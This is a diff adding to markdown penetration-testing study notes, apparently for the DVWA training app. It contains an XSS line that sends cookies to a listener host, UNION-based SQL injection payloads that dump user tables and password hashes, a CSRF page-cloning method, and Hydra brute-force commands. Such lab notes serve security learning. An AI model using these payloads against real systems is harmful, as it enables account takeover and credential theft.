@@ -101,3 +101,65 @@ Start python HTTP server to save cookies from this script
     document.write('<img src="http://192.168.1.9:8000/' + document.cookie + ' ">');
 </SCRIPT>
 ```
+
+## HTML Injection
+
+This vulnerability gives us control over the HTML structure of a website.
+
+`<h1>TEST<h1>`
+
+`<meta http-equiv="refresh" content=0; url=http://google.com" />` - this redirects the user to the specified url
+
+## SQL Injection
+
+error based SQL Injection - `'`
+
+`2' and '1'=1`
+
+`2' ORDER BY 1 --'` - increase the order by number to see how many columns there are
+
+`2' UNION SELECT 1,2 -- '`
+
+`2' UNION SELECT database(), user() -- '` - gives us the database and user name
+
+`2' UNION SELECT schema_name, 2 FROM information_schema.schemata --'`
+
+`2' UNION SELECT table_name, 2 FROM information_schema.tables WHERE table_schema = 'dvwa' -- '`
+
+`2' UNION SELECT column_name, column_type, 2 FROM information_schema.columns WHERE table_schema = 'dvwa' and table_name = 'users' -- '`
+
+Since we only have two fields that display info, we will concat the db response
+
+`2' UNION SELECT CONCAT(user_id, ':', first_name, ':', last_name), CONCAT(user, ':', password) FROM dvwa.users -- '`
+
+You can google a hash to attempt to decrypt it. MD5 hash decrypt websites are available
+
+## CSRF Vulnerability
+
+XSS makes the user execute a program they didn't want to. CSRF exploits functions that make requests inside a user's session. So, you can change details about the user that is saved in a db, perform fake bank transactions, purchase items, etc. To do this, we need to identify an active session to the target website as well as have them access our manipulated website.
+
+We can copy the vulnerable webpage HTML/CSS and then host a copy on our own Apache web server.
+
+Change the filepath to the CSS file. Change the form action to the target website URL. Automatically add a value to the password fields.
+
+Changing the passwords on our fake site changes the passwords on the real site.
+
+## Bruteforce Attack - Hydra
+
+This will work with weak passwords
+
+`hydra`
+
+POST Request - 
+
+`hydra TARGETIP http-post-form "/dvwa/login.php:USERNAMEFIELDNAME=^USER^&PASSWORDFIELDNAME=^PASS^&LOGINBUTTONFIELDNAME=submit(TYPE):ERRORALERTTEXTONFAILEDATTEMPT" -L usernames.txt -P passwords.txt`
+
+GET Request - 
+
+`hydra TARGETIP http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H-Cookie: COOKIEVALUEFROMBURPSUITE" -L usernames.txt -P passwords.txt
+
+## Burpsuite Intruder
+
+This can be simpler than the hydra tool, but the community version of burpsuite has some limitations.
+
+Find request -> Send to Intruder -> Attack type = Cluster bomb -> Clear fields and select fields to bruteforce. Then load username and password files into Payloads tab. 302 response means redirection
